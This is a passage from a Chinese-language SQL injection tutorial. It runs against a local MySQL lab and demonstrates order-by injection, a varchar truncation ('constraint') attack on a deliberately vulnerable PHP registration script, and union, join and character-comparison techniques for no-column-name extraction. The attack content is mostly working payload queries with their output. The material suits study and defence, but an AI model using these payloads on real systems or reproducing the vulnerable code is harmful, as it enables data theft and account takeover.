| username | password |
+----------+----------+
| admin    | admin!@# |
| 1        | ae       |
+----------+----------+
2 rows in set
Time: 0.009s
```

```
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin ') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | admin    |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin!') order by 2
+----------+----------+
| username | password |
+----------+----------+
| 1        | admin!   |
| admin    | admin!@# |
+----------+----------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select username,password from table1 where username='admin' union select 1,binary('admin"') order by 2
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin!@# |
| 1        | admin"   |
+----------+----------+
2 rows in set
Time: 0.008s
```

### limit注入

>todo

### between and注入

### dnslog外带数据

### 文件读写

### 宽字节注入

### 约束攻击

>利用mysql对空格的特殊处理来进行平行越权

>注意varchar长度

```
create table user
(
    id       int auto_increment,
    username varchar(10) null,
    password varchar(10) null,
    constraint user_pk
        primary key (id)
);
```

```
mysql root@localhost:sql_injection_test> select @@version;
+-----------+
| @@version |
+-----------+
| 5.5.47    |
+-----------+
1 row in set
Time: 0.008s

mysql root@localhost:sql_injection_test> select * from user;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | admin    | ASDFG12345 |
+----+----------+------------+
1 row in set
Time: 0.009s
```

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("192.168.241.128", "root", "root", "sql_injection_test", "4700");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
if (empty($_POST['username']) || empty($_POST['password'])) {
    exit();
}
$username = mysqli_real_escape_string($db, $_POST['username']);
$password = mysqli_real_escape_string($db, $_POST['password']);
var_dump($username);
var_dump($password);
$query = "select * from user where username = '$username'";
$result = $db->query($query);
if ($result->fetch_row()) {
    die('已存在该用户');
} else {
    $query = "insert into user (`username`,`password`) values('$username','$password')";
    $db->query($query);
    die('注册成功');
}
```

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("192.168.241.128", "root", "root", "sql_injection_test", "4700");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
if (empty($_POST['username']) || empty($_POST['password'])) {
    exit();
}
$username = mysqli_real_escape_string($db, $_POST['username']);
$password = mysqli_real_escape_string($db, $_POST['password']);
$query = "select * from user where username = '$username' and password='$password';";
$result = $db->query($query);
var_dump($result->fetch_row());
```

直接注册`admin`显然是不可以的,但是可以对`username`传入参数为`admin          a`

```
mysql root@localhost:sql_injection_test> select * from user where username="admin          a"
+----+----------+----------+
| id | username | password |
+----+----------+----------+
0 rows in set
Time: 0.009s
```

显然`admin          a`不存在数据库中,因此进行插入操作,而在进行插入操作时,由于字符串过长,mysql会对字符串进行截断后插入,字符串被截断为`admin     `

mysql对空格会特殊处理,因此在实际插入操作时插入的数据为`admin`,由此达到了平行越权的目的

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282045402.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282047581.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282046916.png)

```
mysql root@localhost:sql_injection_test> select * from `user` where username='admin     ';
+----+------------+------------+
| id | username   | password   |
+----+------------+------------+
| 1  | admin      | ASDFG12345 |
| 2  | admin      | admin      |
+----+------------+------------+
2 rows in set
Time: 0.007s
mysql root@localhost:sql_injection_test> select * from `user`;
+----+------------+------------+
| id | username   | password   |
+----+------------+------------+
| 1  | admin      | ASDFG12345 |
| 2  | admin      | admin      |
+----+------------+------------+
2 rows in set
Time: 0.008s
```

### 无列名注入

1. union

```
mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2 as b,3,4 union select * from table1)a),3,4;
+----+-----------------------+----------+-----------------+
| id | username              | password | email           |
+----+-----------------------+----------+-----------------+
| 1  | admin                 | admin!@# | admin@admin.org |
| 1  | 2,admin,tim,mike,mike | 3        | 4               |
+----+-----------------------+----------+-----------------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2,3 as b,4 union select * from table1)a),3,4;
+----+-------------------------------------+----------+-----------------+
| id | username                            | password | email           |
+----+-------------------------------------+----------+-----------------+
| 1  | admin                               | admin!@# | admin@admin.org |
| 1  | 3,admin!@#,123456,asdfqwer,asdfqwer | 3        | 4               |
+----+-------------------------------------+----------+-----------------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2,3,4 as b union select * from table1)a),3,4;
+----+------------------------------------------------------------+----------+-----------------+
| id | username                                                   | password | email           |
+----+------------------------------------------------------------+----------+-----------------+
| 1  | admin                                                      | admin!@# | admin@admin.org |
| 1  | 4,admin@admin.org,tim@qq.com,mike@gmail.com,mike@gmail.com | 3        | 4               |
+----+------------------------------------------------------------+----------+-----------------+
2 rows in set
Time: 0.008s
```

>分析

```
mysql root@localhost:sql_injection_test> select 1,2 as b,3,4 union select * from table1
+---+-------+----------+-----------------+
| 1 | b     | 3        | 4               |
+---+-------+----------+-----------------+
| 1 | 2     | 3        | 4               |
| 1 | admin | admin!@# | admin@admin.org |
| 2 | tim   | 123456   | tim@qq.com      |
| 3 | mike  | asdfqwer | mike@gmail.com  |
| 4 | mike  | asdfqwer | mike@gmail.com  |
+---+-------+----------+-----------------+
5 rows in set
Time: 0.008s
```

```
mysql root@localhost:sql_injection_test> select group_concat(b) from (select 1,2 as b,3,4 union select * from table1)a
+-----------------------+
| group_concat(b)       |
+-----------------------+
| 2,admin,tim,mike,mike |
+-----------------------+
1 row in set
Time: 0.008s
```

第一次联合查询构造一个列名为`1,b,3,4`的表,并且表中的数据来源于`table1`,第二次联合查询将该列读出来

2. union+order by

看前面的`order by`注入

3. join

>假定union被过滤

[MySQL JOIN 菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)

通过`join`可建立两个表之间的内连接,通过对要查询列名的表与其自身进行内连接,会产生的相同列名,从而发生错误带出数据(即列名)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211800660.png)

`using()`用于两张表之间的`join`连接查询,并且`using()`中的列在两张表中都存在,由此剔除掉前一次注入时得到的列名

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211803273.png)

```
select * from(select * from table1 as a join table1 as b)c;
select * from(select * from table1 as a join table1 as b using (id))c;
select * from(select * from table1 as a join table1 as b using (id,username))c;
```

4. ascii

```
mysql root@localhost:sql_injection_test> select * from test;
+------+
| flag |
+------+
| abcd |
+------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'a')>(select * from test);
+-----------------------------------+
| (select 'a')>(select * from test) |
+-----------------------------------+
| 0                                 |
+-----------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'b')>(select * from test);
+-----------------------------------+
| (select 'b')>(select * from test) |
+-----------------------------------+
| 1                                 |
+-----------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'aa')>(select * from test);
+------------------------------------+
| (select 'aa')>(select * from test) |
+------------------------------------+
| 0                                  |
+------------------------------------+
1 row in set
Time: 0.009s
mysql root@localhost:sql_injection_test> select (select 'ab')>(select * from test);
+------------------------------------+
| (select 'ab')>(select * from test) |
+------------------------------------+
| 0                                  |
+------------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'ac')>(select * from test);
+------------------------------------+
| (select 'ac')>(select * from test) |
+------------------------------------+
| 1                                  |
+------------------------------------+
1 row in set
Time: 0.008s
```

```
mysql root@localhost:sql_injection_test> select (select 'abb')=substr((select * from test),1,3);
+-------------------------------------------------+
| (select 'abb')=substr((select * from test),1,3) |
+-------------------------------------------------+
| 0                                               |
+-------------------------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'abc')=substr((select * from test),1,3);
+-------------------------------------------------+
| (select 'abc')=substr((select * from test),1,3) |
+-------------------------------------------------+
| 1                                               |
+-------------------------------------------------+
1 row in set
Time: 0.008s
```

### insert update delete注入

## 未完待续...